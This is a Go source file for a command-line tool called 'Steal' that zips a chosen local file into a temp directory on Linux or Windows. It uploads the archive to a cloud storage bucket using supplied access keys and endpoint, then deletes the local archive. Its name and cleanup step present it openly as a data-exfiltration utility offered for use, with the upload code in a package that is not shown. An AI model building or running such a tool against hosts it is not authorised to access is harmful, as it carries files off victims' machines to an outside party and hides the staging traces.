package main

import (
	"Steal/pakg/pack"
	"Steal/pakg/upload"
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"time"
)

var (
	AccessKeyId     = flag.String("k", "", "AccessKeyId")
	AccessKeySecret = flag.String("s", "", "AccessKeySecret")
	Endpoint        = flag.String("e", "", "Endpoint")
	file            = flag.String("f", "", "local file path")
	Bucket          = flag.String("b", "", "Bucket")
	h               = flag.Bool("h", false, "help")
)

func main() {
	src := *file
	if ok, _ := PathExists(src); !ok {
		fmt.Println("[-] The specified file does not exist")
		os.Exit(-1)
	}
	sysType := runtime.GOOS
	var dst string
	fileName := filepath.Base(src)
	nowTime := strconv.FormatInt(time.Now().Unix(), 10)
	if sysType == "linux" {
		dst = "/tmp/" + fileName + "_" + nowTime + ".zip"
	}
	if sysType == "windows" {
		dst = "C:\\Windows\\Temp" + "\\" + fileName + "_" + nowTime + ".zip"
	}
	fmt.Println("[+] In the compression")
	if pack.Zip(src, dst) != nil {
		fmt.Println("[-] File packing error")
		os.Exit(-1)
	}
	fmt.Println("[+] Packaging complete")
	if upload.Upload(dst, *AccessKeyId, *AccessKeySecret, *Endpoint, *Bucket) != nil {
		fmt.Println("[-] File upload error, please check the input parameter value")
		os.Exit(-1)
	}
	if os.Remove(dst) != nil {
		fmt.Println("[-] Failed to delete the package file. Manually delete the package file")
	} else {
		fmt.Println("[+] Temporary file deleted successfully")
	}
	fmt.Println("[+] The file was uploaded successfully")

}

func init() {
	Banner := "   _____  __                __\n  / ___/ / /_ ___   ____ _ / /\n  \\__ \\ / __// _ \\ / __ `// / \n ___/ // /_ /  __// /_/ // /  \n/____/ \\__/ \\___/ \\__,_//_/   \n                                    By @ 7TEN7               "
	flag.Parse()
	fmt.Println(Banner)
	if len(os.Args) <= 4 {
		fmt.Println("Steal version: Steal/0.0.2\nUsage: Steal [-k AccessKeyId] [-s AccessKeySecret] [-e Endpoint] [-b Bucket] [-f file]\n\nOptions:\n")
		flag.PrintDefaults()
		os.Exit(0)
	}
	if *h == true {
		fmt.Println("Steal version: Steal/0.0.2\nUsage: Steal [-k AccessKeyId] [-s AccessKeySecret] [-e Endpoint] [-b Bucket] [-f file]\n\nOptions:\n")
		flag.PrintDefaults()
		os.Exit(0)
	}
}

func PathExists(path string) (bool, error) {
	_, err := os.Stat(path)
	if err == nil {
		return true, nil
	}
	if os.IsNotExist(err) {
		return false, nil
	}
	return false, err
}
